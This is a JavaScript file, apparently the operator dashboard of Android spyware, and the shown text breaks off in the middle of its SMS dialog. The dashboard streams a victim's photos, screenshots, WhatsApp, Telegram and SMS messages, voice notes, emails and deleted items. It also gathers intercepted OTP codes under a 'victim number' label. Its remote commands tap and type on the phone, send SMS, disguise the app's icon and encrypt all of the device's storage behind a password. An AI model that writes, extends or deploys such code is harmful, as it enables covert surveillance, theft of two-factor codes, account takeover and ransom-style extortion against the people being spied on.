function getAuthToken() {
    return sessionStorage.getItem('auth_token') || '';
}

function isOwner() {
    return sessionStorage.getItem('is_owner') === 'true';
}

function authFetch(url, options = {}) {
    const token = getAuthToken();
    if (!token) return fetch(url, options);
    const separator = url.includes('?') ? '&' : '?';
    return fetch(url + separator + 'token=' + encodeURIComponent(token), options);
}

let currentDevice = null;
let updateInterval = null;
let dataInterval = null;
let allCalls = [];
let allSMS = [];
let allContacts = [];
let allDeleted = [];
let currentChat = null;
let currentCallNumber = null;
let currentContact = null;
let wasOffline = true;
let lastCallCount = 0;
let lastSmsCount = 0;
let lastDeletedCount = 0;
let soundPlayedForDevice = false;
let sse = null;

let liveImages = [];
let liveMsgs = [];
let liveMsgsFilter = 'all';
let liveOtps = [];
let deletedFilter = 'all';
let liveVoices = [];
let liveEmails = [];

let panelOpenTime = Date.now();
let liveFilterEnabled = true;

function logout() {
    const token = getAuthToken();
    if (token) {
        fetch('/auth/logout', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token })
        }).catch(() => {});
    }
    sessionStorage.removeItem('logged_in');
    sessionStorage.removeItem('auth_token');
    sessionStorage.removeItem('is_owner');
    window.location.href = 'login.html';
}

function playNotificationSound() { try { const audio = new Audio('v.wav'); audio.volume = 1.0; audio.play(); } catch (e) {} }

function findContactName(number) {
    if (!allContacts || allContacts.length === 0 || !number) return null;
    const cleanNumber = number.replace(/[^0-9]/g, '').slice(-9);
    for (let contact of allContacts) {
        const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
        for (let n of numbers) {
            if (!n) continue;
            if (n.replace(/[^0-9]/g, '').slice(-9) === cleanNumber) return contact.name;
        }
    }
    return null;
}

function showNotification(title, message, icon) {
    const div = document.createElement('div');
    div.className = 'notification-popup';
    div.innerHTML = `<div class="notification-icon">${icon}</div><div class="notification-content"><div class="notification-title">${title}</div><div class="notification-message" style="white-space:pre-wrap;">${message}</div></div><button class="notification-close" onclick="this.parentElement.remove()">✕</button>`;
    document.body.appendChild(div);
    playNotificationSound();
    setTimeout(() => { if (div.parentElement) div.remove(); }, 8000);
}

function initSSE() {
    if (sse) { try { sse.close(); } catch(e){} sse = null; }
    if (!currentDevice) return;

    try {
        sse = new EventSource(
            `/events.php?device=${encodeURIComponent(currentDevice)}&token=${encodeURIComponent(getAuthToken())}`
        );

        sse.addEventListener('new_media', (e) => {
            try {
                const data = JSON.parse(e.data);
                const imgTime = data.date || 0;
                if (!liveFilterEnabled || imgTime >= panelOpenTime) addLiveImage(data);
                const labels = { camera: '📸 كاميرا', screenshot: '📱 سكرين شوت', screen_record: '🎥 تسجيل شاشة', whatsapp: '💬 واتساب', telegram: '✈️ تيليجرام', download: '⬇️ تحميل', unknown: '📁 ملف' };
                const label = labels[data.source] || '📁 ملف';
                showNotification(`${label} جديد`, data.name || 'ملف جديد', '🖼️');
                prependImageCard(data);
                const badge = document.getElementById('imagesCount');
                if (badge) {
                    const n = parseInt((badge.textContent || '').replace(/[^0-9]/g, '')) || 0;
                    badge.textContent = `(${n + 1}) 🔴`;
                    badge.className = 'count badge-new';
                }
            } catch (err) {}
        });

        sse.addEventListener('new_voice', (e) => {
            try {
                const data = JSON.parse(e.data);
                const vTime = data.timestamp || 0;
                if (!liveFilterEnabled || vTime >= panelOpenTime) addLiveVoice(data);
                const srcLabel = data.source === 'telegram_voice' ? '✈️ تيليجرام' : '💬 واتساب';
                const dirLabel = data.direction === 'sent' ? '📤 مرسلة' : data.direction === 'received' ? '📥 مستلمة' : '🎤';
                showNotification(`🎤 صوتية ${srcLabel}`, `${dirLabel} — ${data.file_name || ''} (${(data.file_size / 1024).toFixed(1)} KB)`, '🎤');
            } catch (err) {}
        });

        sse.addEventListener('new_whatsapp', (e) => {
            try {
                const data = JSON.parse(e.data);
                showNotification(data.image_data ? '📷 صورة جديدة' : '💬 رسالة جديدة', `${data.sender || 'غير معروف'}: ${data.message || ''}`, '💬');
                const chatWindow = document.getElementById('whatsappChatWindow');
                if (chatWindow && currentChat === data.sender) appendWhatsAppMessage(data);
                loadWhatsApp();
                const badge = document.getElementById('whatsappCount');
                if (badge) {
                    const n = parseInt((badge.textContent || '').replace(/[^0-9]/g, '')) || 0;
                    badge.textContent = `(${n + 1}) 🔴`;
                    badge.className = 'count badge-new';
                }
            } catch (err) {}
        });

        sse.addEventListener('new_email', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveEmail(data);
                showNotification(`📧 ${data.app_name || 'بريد'} جديد`, `${data.sender || 'غير معروف'}: ${data.subject || ''}`, '📧');
                loadEmails();
                const badge = document.getElementById('emailsCount');
                if (badge) {
                    const n = parseInt((badge.textContent || '').replace(/[^0-9]/g, '')) || 0;
                    badge.textContent = `(${n + 1}) 🔴`;
                    badge.className = 'count badge-new';
                }
            } catch (err) {}
        });

        sse.addEventListener('new_sms', (e) => { try { addLiveMsg(JSON.parse(e.data)); } catch (err) {} });

        sse.addEventListener('new_otp', (e) => {
            try {
                const data = JSON.parse(e.data);
                addLiveOtp(data);
                showNotification('🔐 كود OTP وصل!', `الكود: ${data.code || ''}`, '🔐');
            } catch (err) {}
        });

        sse.addEventListener('new_deleted', (e) => {
            try {
                const data = JSON.parse(e.data);
                const typeLabels = { call_log: '📞 مكالمة محذوفة', sms: '💬 رسالة محذوفة', contact: '👤 جهة محذوفة', image: '🖼️ صورة محذوفة' };
                const label = typeLabels[data.type] || '🗑️ عنصر محذوف';
                let preview = '';
                if (data.item) {
                    if (data.type === 'call_log') preview = data.item.number || '';
                    else if (data.type === 'sms') preview = data.item.address || '';
                    else if (data.type === 'contact') preview = data.item.name || '';
                    else if (data.type === 'image') preview = data.item.name || '';
                }
                showNotification(label, preview || 'تم الحذف للتو', '🗑️');
                loadDeleted();
            } catch (err) {}
        });

        sse.addEventListener('sim_info', (e) => {
            try {
                const data = JSON.parse(e.data);
                if (data.sims && data.sims.length > 0) {
                    const firstSim = data.sims.find(s => s.number && s.number.length > 0);
                    if (firstSim && currentDevice) {
                        const display = document.getElementById('deviceNameDisplay');
                        if (display && !display.textContent.includes(firstSim.number)) {
                            const baseName = display.textContent.split(' — ')[0];
                            display.textContent = `${baseName} — 📱 ${firstSim.number}`;
                        }
                    }
                }
            } catch (err) {}
        });

        sse.addEventListener('sms_send_result', (e) => {
            try {
                const d = JSON.parse(e.data);
                let msg = `إلى: ${d.number || ''}`;
                if (d.error && !d.success) msg += `\nالسبب: ${d.error}`;
                showNotification(d.success ? '✅ SMS أُرسلت' : '❌ فشل إرسال SMS', msg, '📨');
            } catch (err) {}
        });

        sse.onerror = () => {
            try { sse.close(); } catch(e){}
            sse = null;
            if (!getAuthToken()) { window.location.href = 'login.html'; return; }
            setTimeout(initSSE, 3000);
        };

    } catch (e) {}
}

function prependImageCard(image) {
    const grid = document.getElementById('imagesGrid');
    if (!grid) return;
    const div = document.createElement('div');
    div.className = 'image-card';
    div.style.animation = 'fadeIn 0.5s';
    const img = document.createElement('img');
    let m = 'image/jpeg';
    if (image.name) {
        const e = image.name.toLowerCase().split('.').pop();
        if (e === 'png') m = 'image/png';
        else if (e === 'webp') m = 'image/webp';
        else if (e === 'gif') m = 'image/gif';
    }
    img.src = `data:${m};base64,${image.data}`;
    img.className = 'thumb';
    const name = document.createElement('div');
    name.className = 'image-name';
    name.textContent = image.name || 'صورة جديدة';
    const btns = document.createElement('div');
    btns.className = 'image-buttons';
    const v = document.createElement('button');
    v.className = 'view-btn'; v.textContent = '👁️';
    v.onclick = () => window.open(img.src);
    const d = document.createElement('button');
    d.className = 'download-btn'; d.textContent = '⬇️';
    d.onclick = () => {
        const a = document.createElement('a');
        a.href = img.src;
        a.download = image.name;
        document.body.appendChild(a);
        a.click();
        a.remove();
    };
    btns.appendChild(v); btns.appendChild(d);
    div.appendChild(img); div.appendChild(name); div.appendChild(btns);
    grid.insertBefore(div, grid.firstChild);
}

function appendWhatsAppMessage(msg) {
    const container = document.getElementById('whatsappMessagesContainer');
    if (!container) return;
    const displayName = findContactName(msg.sender) || msg.sender || '';
    const div = document.createElement('div');
    div.className = 'wa-msg';
    div.setAttribute('data-timestamp', msg.timestamp);
    div.style.animation = 'fadeIn 0.3s';
    div.innerHTML = `
        <div style="display:flex;justify-content:flex-start;">
            <div style="max-width:70%;padding:12px 15px;border-radius:15px;background:#1e2a2a;margin-right:auto;border-bottom-left-radius:5px;">
                <div style="color:#25D366;font-size:11px;font-weight:bold;margin-bottom:3px;">📥 ${displayName}</div>
                ${msg.image_data ? `<img src="data:image/jpeg;base64,${msg.image_data}" onclick="window.open(this.src)" style="max-width:250px;border-radius:10px;cursor:pointer;display:block;margin-bottom:5px;">` : ''}
                <div style="color:white;font-size:15px;">${msg.message_type === 'image' ? '📷' : msg.message_type === 'video' ? '🎬' : msg.message_type === 'audio' ? '🎵' : msg.message_type === 'document' ? '📄' : ''} ${msg.message || ''}</div>
                <div style="color:#aaa;font-size:11px;text-align:left;margin-top:3px;">${formatWhatsAppDate(msg.timestamp)}</div>
            </div>
        </div>
    `;
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
}

// ═══ الفيد الحي — الصور ═══
function openLiveImages() { document.getElementById('liveImagesOverlay').style.display = 'block'; renderLiveImages(); }
function closeLiveImages() { document.getElementById('liveImagesOverlay').style.display = 'none'; }
function clearLiveImages() { if (!confirm('مسح كل الصور من الفيد الحي؟')) return; liveImages = []; document.getElementById('liveImagesCount').textContent = '0'; renderLiveImages(); }
function addLiveImage(img) {
    liveImages.unshift(img);
    if (liveImages.length > 200) liveImages = liveImages.slice(0, 200);
    const el = document.getElementById('liveImagesCount');
    if (el) el.textContent = liveImages.length;
    const btn = document.getElementById('liveImagesBtn');
    if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
    if (document.getElementById('liveImagesOverlay').style.display === 'block') renderLiveImages();
}
function renderLiveImages() {
    const grid = document.getElementById('liveImagesGrid');
    if (!grid) return;
    if (liveImages.length === 0) { grid.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">في انتظار صور جديدة...</p>'; return; }
    grid.innerHTML = '';
    liveImages.forEach((img, idx) => {
        const card = document.createElement('div');
        card.style.cssText = 'background:#111;padding:10px;border-radius:8px;border:1px solid #00ffcc;position:relative;';
        let m = 'image/jpeg';
        if (img.name) {
            const e = img.name.toLowerCase().split('.').pop();
            if (e === 'png') m = 'image/png';
            else if (e === 'webp') m = 'image/webp';
            else if (e === 'gif') m = 'image/gif';
        }
        const sourceLabels = { camera: '📸 كاميرا', screenshot: '📱 سكرين شوت', screen_record: '🎥 تسجيل', whatsapp: '💬 واتساب', telegram: '✈️ تيليجرام', download: '⬇️ تحميل', unknown: '📁 ملف' };
        const srcLabel = sourceLabels[img.source] || '📁 ملف';
        card.innerHTML = `
            <img src="data:${m};base64,${img.data}" style="width:100%;height:180px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
            <div style="color:#00ffcc;font-size:12px;margin-top:8px;font-weight:bold;">${srcLabel}</div>
            <div style="color:#ccc;font-size:11px;margin-top:3px;word-break:break-all;">${img.name || 'صورة'}</div>
            <div style="color:#888;font-size:10px;margin-top:3px;">${formatDate(img.date)}</div>
            <div style="display:flex;gap:5px;margin-top:8px;">
                <button onclick="downloadLiveImage(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️ تحميل</button>
                <button onclick="deleteLiveImage(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️ حذف</button>
            </div>
        `;
        grid.appendChild(card);
    });
}
function downloadLiveImage(idx) {
    const img = liveImages[idx];
    if (!img) return;
    let m = 'image/jpeg';
    if (img.name) {
        const e = img.name.toLowerCase().split('.').pop();
        if (e === 'png') m = 'image/png';
        else if (e === 'webp') m = 'image/webp';
    }
    const a = document.createElement('a');
    a.href = `data:${m};base64,${img.data}`;
    a.download = img.name || 'image.jpg';
    document.body.appendChild(a);
    a.click();
    a.remove();
}
function deleteLiveImage(idx) { if (!confirm('حذف هذه الصورة من الفيد الحي؟')) return; liveImages.splice(idx, 1); document.getElementById('liveImagesCount').textContent = liveImages.length; renderLiveImages(); }

// ═══ الفيد الحي — الرسائل ═══
function openLiveMessages() { document.getElementById('liveMsgsOverlay').style.display = 'block'; renderLiveMsgs(); }
function closeLiveMessages() { document.getElementById('liveMsgsOverlay').style.display = 'none'; }
function clearLiveMsgs() { if (!confirm('مسح كل الرسائل من الفيد الحي؟')) return; liveMsgs = []; document.getElementById('liveMsgsCount').textContent = '0'; renderLiveMsgs(); }
function filterLiveMsgs(type) {
    liveMsgsFilter = type;
    const setBg = (id, active) => { const el = document.getElementById(id); if (el) el.style.background = active ? '#ff0066' : '#333'; };
    setBg('filterAll', type === 'all');
    setBg('filterIn', type === 'in');
    setBg('filterOut', type === 'out');
    renderLiveMsgs();
}
function addLiveMsg(msg) {
    liveMsgs.unshift(msg);
    if (liveMsgs.length > 500) liveMsgs = liveMsgs.slice(0, 500);
    const el = document.getElementById('liveMsgsCount');
    if (el) el.textContent = liveMsgs.length;
    const btn = document.getElementById('liveMsgsBtn');
    if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
    if (document.getElementById('liveMsgsOverlay').style.display === 'block') renderLiveMsgs();
}
function renderLiveMsgs() {
    const list = document.getElementById('liveMsgsList');
    if (!list) return;
    let filtered = liveMsgs;
    if (liveMsgsFilter === 'in') filtered = liveMsgs.filter(m => m.type == 1);
    if (liveMsgsFilter === 'out') filtered = liveMsgs.filter(m => m.type == 2);
    if (filtered.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل مطابقة</p>'; return; }
    list.innerHTML = '';
    filtered.forEach((msg) => {
        const realIdx = liveMsgs.indexOf(msg);
        const isIncoming = msg.type == 1;
        const displayName = findContactName(msg.address) || msg.address || 'غير معروف';
        const div = document.createElement('div');
        div.style.cssText = `display:flex;${isIncoming ? 'justify-content:flex-start;' : 'justify-content:flex-end;'}`;
        div.innerHTML = `
            <div style="max-width:70%;background:${isIncoming ? '#1e2a2a' : '#2a1a20'};border:1px solid ${isIncoming ? '#25D366' : '#ff0066'};padding:12px 15px;border-radius:15px;">
                <div style="color:${isIncoming ? '#25D366' : '#ff0066'};font-size:11px;font-weight:bold;margin-bottom:5px;">${isIncoming ? '📥 مستلمة' : '📤 مرسلة'} — ${displayName}</div>
                <div style="color:#fff;font-size:14px;line-height:1.5;">${msg.body || ''}</div>
                <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;gap:10px;">
                    <span style="color:#888;font-size:11px;">${formatDate(msg.date)}</span>
                    <button onclick="deleteLiveMsg(${realIdx})" style="background:none;border:none;color:#ff3300;cursor:pointer;font-size:14px;">🗑️</button>
                </div>
            </div>
        `;
        list.appendChild(div);
    });
}
function deleteLiveMsg(idx) { if (!confirm('حذف هذه الرسالة من الفيد؟')) return; liveMsgs.splice(idx, 1); document.getElementById('liveMsgsCount').textContent = liveMsgs.length; renderLiveMsgs(); }

// ═══ الفيد الحي — OTP ═══
function openLiveOtp() { document.getElementById('liveOtpOverlay').style.display = 'block'; renderLiveOtp(); }
function closeLiveOtp() { document.getElementById('liveOtpOverlay').style.display = 'none'; }
function clearLiveOtp() { if (!confirm('مسح كل الأكواد من الفيد الحي؟')) return; liveOtps = []; document.getElementById('liveOtpCount').textContent = '0'; renderLiveOtp(); }
function addLiveOtp(otp) {
    liveOtps.unshift(otp);
    if (liveOtps.length > 200) liveOtps = liveOtps.slice(0, 200);
    const el = document.getElementById('liveOtpCount');
    if (el) el.textContent = liveOtps.length;
    const btn = document.getElementById('liveOtpBtn');
    if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
    if (document.getElementById('liveOtpOverlay').style.display === 'block') renderLiveOtp();
}
function renderLiveOtp() {
    const list = document.getElementById('liveOtpList');
    if (!list) return;
    if (liveOtps.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد أكواد OTP بعد</p>'; return; }
    list.innerHTML = '';
    liveOtps.forEach((otp, idx) => {
        const div = document.createElement('div');
        div.style.cssText = 'background:#1a1a00;border:2px solid #ffcc00;padding:20px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#ffcc00;font-size:12px;font-weight:bold;margin-bottom:8px;">${otp.app_name || 'OTP'} — ${formatDate(otp.timestamp)}</div>
            <div style="color:#fff;font-size:32px;font-weight:bold;letter-spacing:5px;margin:10px 0;">${otp.code || '—'}</div>
            <div style="color:#ccc;font-size:13px;margin-bottom:5px;">📱 رقم الضحية: <b style="color:#00ffcc;">${otp.victim_number || 'غير معروف'}</b></div>
            <div style="color:#aaa;font-size:12px;margin-bottom:5px;">المرسل: ${otp.sender || '—'}</div>
            <div style="color:#888;font-size:11px;word-break:break-all;">النص: ${otp.message || ''}</div>
            <button onclick="deleteLiveOtp(${idx})" style="margin-top:10px;background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>
        `;
        list.appendChild(div);
    });
}
function deleteLiveOtp(idx) { if (!confirm('حذف هذا الكود من الفيد؟')) return; liveOtps.splice(idx, 1); document.getElementById('liveOtpCount').textContent = liveOtps.length; renderLiveOtp(); }

// ═══ الفيد الحي — الصوتيات ═══
function openLiveVoices() { document.getElementById('liveVoicesOverlay').style.display = 'block'; renderLiveVoices(); }
function closeLiveVoices() { document.getElementById('liveVoicesOverlay').style.display = 'none'; }
function clearLiveVoices() { if (!confirm('مسح كل الرسائل الصوتية من الفيد الحي؟')) return; liveVoices = []; document.getElementById('liveVoicesCount').textContent = '0'; renderLiveVoices(); }
function addLiveVoice(voice) {
    liveVoices.unshift(voice);
    if (liveVoices.length > 200) liveVoices = liveVoices.slice(0, 200);
    const el = document.getElementById('liveVoicesCount');
    if (el) el.textContent = liveVoices.length;
    const btn = document.getElementById('liveVoicesBtn');
    if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
    if (document.getElementById('liveVoicesOverlay').style.display === 'block') renderLiveVoices();
}
function renderLiveVoices() {
    const list = document.getElementById('liveVoicesList');
    if (!list) return;
    if (liveVoices.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل صوتية بعد</p>'; return; }
    list.innerHTML = '';
    liveVoices.forEach((voice, idx) => {
        const sourceLabels = { whatsapp_voice: '💬 واتساب', telegram_voice: '✈️ تيليجرام', unknown: '🎤 صوت' };
        const srcLabel = sourceLabels[voice.source] || '🎤 صوت';
        const dirLabel = voice.direction === 'sent' ? '📤 مرسلة' : voice.direction === 'received' ? '📥 مستلمة' : '🎤 صوتية';
        const div = document.createElement('div');
        div.style.cssText = 'background:#0a1a1a;border:2px solid #00ffcc;padding:15px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#00ffcc;font-size:13px;font-weight:bold;margin-bottom:8px;">${dirLabel} — ${srcLabel}</div>
            <div style="color:#ccc;font-size:13px;margin-bottom:8px;">📅 ${formatDate(voice.timestamp)}</div>
            <div style="color:#888;font-size:11px;margin-bottom:8px;word-break:break-all;">${voice.file_name || ''} (${((voice.file_size||0) / 1024).toFixed(1)} KB)</div>
            <audio controls style="width:100%;margin-bottom:8px;" preload="none">
                <source src="data:audio/ogg;base64,${voice.file_data}" type="audio/ogg">
                <source src="data:audio/mp4;base64,${voice.file_data}" type="audio/mp4">
                <source src="data:audio/mpeg;base64,${voice.file_data}" type="audio/mpeg">
            </audio>
            <div style="display:flex;gap:8px;">
                <button onclick="downloadLiveVoice(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️ تحميل</button>
                <button onclick="deleteLiveVoice(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️ حذف</button>
            </div>
        `;
        list.appendChild(div);
    });
}
function downloadLiveVoice(idx) {
    const v = liveVoices[idx];
    if (!v) return;
    let mime = 'audio/ogg';
    if (v.file_name) {
        const n = v.file_name.toLowerCase();
        if (n.endsWith('.opus') || n.endsWith('.ogg')) mime = 'audio/ogg';
        else if (n.endsWith('.m4a')) mime = 'audio/mp4';
        else if (n.endsWith('.mp3')) mime = 'audio/mpeg';
        else if (n.endsWith('.aac')) mime = 'audio/aac';
    }
    const a = document.createElement('a');
    a.href = `data:${mime};base64,${v.file_data}`;
    a.download = v.file_name || 'voice.opus';
    document.body.appendChild(a);
    a.click();
    a.remove();
}
function deleteLiveVoice(idx) { if (!confirm('حذف هذه الرسالة الصوتية من الفيد؟')) return; liveVoices.splice(idx, 1); document.getElementById('liveVoicesCount').textContent = liveVoices.length; renderLiveVoices(); }

// ═══ الفيد الحي — البريد ═══
function openLiveEmails() { document.getElementById('liveEmailsOverlay').style.display = 'block'; renderLiveEmails(); }
function closeLiveEmails() { document.getElementById('liveEmailsOverlay').style.display = 'none'; }
function clearLiveEmails() { if (!confirm('مسح كل البريد من الفيد الحي؟')) return; liveEmails = []; document.getElementById('liveEmailsCount').textContent = '0'; renderLiveEmails(); }
function addLiveEmail(email) {
    liveEmails.unshift(email);
    if (liveEmails.length > 200) liveEmails = liveEmails.slice(0, 200);
    const el = document.getElementById('liveEmailsCount');
    if (el) el.textContent = liveEmails.length;
    const btn = document.getElementById('liveEmailsBtn');
    if (btn) { btn.style.animation = 'none'; setTimeout(() => { btn.style.animation = 'nameGlow 1s 3'; }, 10); }
    if (document.getElementById('liveEmailsOverlay').style.display === 'block') renderLiveEmails();
}
function renderLiveEmails() {
    const list = document.getElementById('liveEmailsList');
    if (!list) return;
    if (liveEmails.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد رسائل بريد بعد</p>'; return; }
    list.innerHTML = '';
    liveEmails.forEach((email, idx) => {
        const div = document.createElement('div');
        div.style.cssText = 'background:#1a1a2e;border:2px solid #00aaff;padding:15px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#00aaff;font-size:13px;font-weight:bold;margin-bottom:8px;">📧 ${email.app_name || 'Email'}</div>
            <div style="color:#ccc;font-size:13px;margin-bottom:5px;">👤 <b>${email.sender || 'غير معروف'}</b></div>
            <div style="color:#fff;font-size:14px;margin-bottom:5px;font-weight:bold;">${email.subject || ''}</div>
            <div style="color:#888;font-size:12px;margin-bottom:8px;">${email.snippet || ''}</div>
            <div style="color:#aaa;font-size:11px;margin-bottom:8px;">📅 ${formatDate(email.timestamp)}</div>
            ${email.image_data ? `<img src="data:image/jpeg;base64,${email.image_data}" style="max-width:200px;border-radius:5px;margin-bottom:8px;cursor:pointer;" onclick="window.open(this.src)">` : ''}
            <button onclick="deleteLiveEmail(${idx})" style="background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>
        `;
        list.appendChild(div);
    });
}
function deleteLiveEmail(idx) { if (!confirm('حذف هذا البريد من الفيد؟')) return; liveEmails.splice(idx, 1); document.getElementById('liveEmailsCount').textContent = liveEmails.length; renderLiveEmails(); }

// ═══════════════════════════════════════════════════════
// ⚡ المميزات المتقدمة
// ═══════════════════════════════════════════════════════

function advancedAction(cmd, extra) {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    const body = { device: currentDevice, command: cmd, token: getAuthToken() };
    if (extra) Object.assign(body, extra);

    fetch('/api.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
    }).then(r => r.json()).then(d => {
        if (d.success) showNotification('✅ تم', 'تم إرسال الأمر للجهاز', '⚡');
        else alert('❌ فشل — تأكد أن السيرفر يعمل');
    }).catch(() => alert('❌ خطأ في الاتصال'));
}

function autoClickText() {
    const text = document.getElementById('clickText').value.trim();
    if (!text) { alert('⚠️ اكتب نص الزر'); return; }
    advancedAction('auto_click', { text });
    document.getElementById('clickText').value = '';
}

function autoReplyAny() {
    const msg = document.getElementById('autoReplyText').value.trim();
    if (!msg) { alert('⚠️ اكتب الرد'); return; }
    advancedAction('auto_reply_any', { message: msg });
    document.getElementById('autoReplyText').value = '';
}

function typeText() {
    const text = document.getElementById('typeTextInput').value.trim();
    if (!text) { alert('⚠️ اكتب النص'); return; }
    advancedAction('type_text', { text });
    document.getElementById('typeTextInput').value = '';
}

function encryptFiles() {
    const pw = document.getElementById('encryptionPassword').value;
    if (!pw || pw.length < 4) { alert('⚠️ كلمة المرور قصيرة (4+ أحرف)'); return; }
    if (!confirm('⚠️ سيتم تشفير كل التخزين!\n\n• قد يستغرق ساعات\n• لا يمكن الفك بدون كلمة المرور\n• الملفات تُفقد للأبد إذا نسيت كلمة المرور\n\nاستمر؟')) return;
    advancedAction('encrypt_files', { password: pw });
    showNotification('🔐 جاري التشفير', 'ستبدأ العملية خلال ثواني — قد تستغرق ساعات', '🔐');
}

function decryptFiles() {
    const pw = document.getElementById('encryptionPassword').value;
    if (!pw) { alert('⚠️ أدخل كلمة المرور'); return; }
    if (!confirm('🔓 فك تشفير كل الملفات؟')) return;
    advancedAction('decrypt_files', { password: pw });
    showNotification('🔓 جاري الفك', 'سيبدأ خلال ثواني', '🔓');
}

function openApp() {
    const pkg = document.getElementById('openAppPackage').value.trim();
    if (!pkg) { alert('⚠️ اكتب اسم الباكج'); return; }
    advancedAction('open_app', { package: pkg });
    document.getElementById('openAppPackage').value = '';
}

// ═══ التنكر ═══
async function changeDisguise(appName) {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'disguise', app: appName, token: getAuthToken() })
        });
        const result = await response.json();
        if (result.success) {
            showNotification('🎭 تم إرسال الأمر', `سيتم التغيير خلال 30 ثانية إلى "${appName}"`, '🎭');
            document.getElementById('disguiseOverlay').remove();
        } else alert('❌ فشل');
    } catch (e) { alert('❌ خطأ: ' + e.message); }
}

function openDisguiseMenu() {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    if (document.getElementById('disguiseOverlay')) return;

    const options = [
        { id: 'Default',    label: '📱 رسائل (افتراضي)',    bg: '#333' },
        { id: 'Youtube',    label: '▶️ YouTube',            bg: '#ff0000' },
        { id: 'Twitter',    label: '🐦 Twitter / X',        bg: '#000' },
        { id: 'Facebook',   label: '👥 Facebook',           bg: '#1877f2' },
        { id: 'Settings',   label: '⚙️ Settings',           bg: '#555' },
        { id: 'Gallery',    label: '🖼️ Gallery',            bg: '#4285f4' },
        { id: 'Chrome',     label: '🌐 Chrome',             bg: '#4285f4' },
        { id: 'Gmail',      label: '📧 Gmail',              bg: '#ea4335' },
        { id: 'Calculator', label: '🧮 Calculator',         bg: '#2c3e50' }
    ];

    const ov = document.createElement('div');
    ov.id = 'disguiseOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;overflow-y:auto;padding:20px;';
    ov.innerHTML = `
        <div style="max-width:450px;margin:0 auto;background:#111;border:2px solid #00ffcc;border-radius:15px;padding:25px;">
            <h2 style="color:#00ffcc;text-align:center;margin-bottom:10px;">🎭 تغيير الأيقونة</h2>
            <p style="color:#888;font-size:12px;text-align:center;margin-bottom:20px;">
                ⚠️ بعد التغيير — قد تحتاج خروج ودخول للشاشة الرئيسية<br>
                لعرض الأيقونة الجديدة
            </p>
            <div style="display:flex;flex-direction:column;gap:10px;">
                ${options.map(o => `
                    <button onclick="changeDisguise('${o.id}')" style="background:${o.bg};color:#fff;border:1px solid #444;padding:14px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:15px;text-align:right;">${o.label}</button>
                `).join('')}
            </div>
            <button onclick="document.getElementById('disguiseOverlay').remove()" style="width:100%;margin-top:15px;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;">✖ إغلاق</button>
        </div>
    `;
    document.body.appendChild(ov);
}

// ═══ إرسال SMS ═══
async function sendSmsCommand(number, message) {
    try {
        const response = await fetch('/api.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ device: currentDevice, command: 'send_sms_direct', number: number, message: message, token: getAuthToken() })
        });
        return (await response.json()).success;
    } catch (e) { return false; }
}

function openSendSms() {
    if (document.getElementById('smsSendOverlay')) return;
    const ov = document.createElement('div');
    ov.id = 'smsSendOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;';
    ov.innerHTML = `
        <div style="background:#111;border:2px solid #00ffcc;border-radius:15px;padding:30px;max-width:450px;width:100%;">
            <h2 style="color:#00ffcc;margin-bottom:20px;text-align:center;">📨 إرسال SMS</h2>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">رقم المستلم</label>
                <input id="smsNumber" type="tel" placeholder="+967712345678" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;font-size:15px;">
            </div>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">النص</label>
                <textarea id="smsMessage" rows="4" placeholder="اكتب الرسالة..." style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #00ffcc;border-radius:8px;font-size:15px;resize:vertical;"></textarea>
            </div>
            <div style="display:flex;gap:10px;">
